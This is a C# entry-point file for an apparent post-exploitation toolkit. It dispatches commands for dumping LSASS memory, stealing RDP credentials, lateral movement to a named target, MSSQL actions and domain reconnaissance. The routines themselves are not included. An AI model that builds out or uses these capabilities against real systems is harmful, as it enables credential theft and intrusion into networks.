using System;
using System.Collections.Generic;

namespace ExtensionToolkit
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("No command provided.");
                return;
            }

            var commandMap = new Dictionary<string, Action>
            {
                { "lsass", () => Func.DumpLsass.DumpLs() },
                { "rdpsteal", () => Func.RdpInjection.StealRdp() },
                { "lateral_movement", () => ExecuteLateralMovement(args) },
                { "sql", () => Func.MsSql.Sql(args) },
                { "recon", () => Func.DomainRecon.Recon(args) }
            };

            if (commandMap.TryGetValue(args[0], out Action action))
            {
                action();
            }
            else
            {
                Console.WriteLine("Unknown command.");
            }
        }

        private static void ExecuteLateralMovement(string[] args)
        {
            if (args.Length > 1)
            {
                string target = args[1];
                Func.LateralMovement.LateralService(target);
            }
            else
            {
                Console.WriteLine("No target specified for lateral movement.");
            }
        }

    }
}
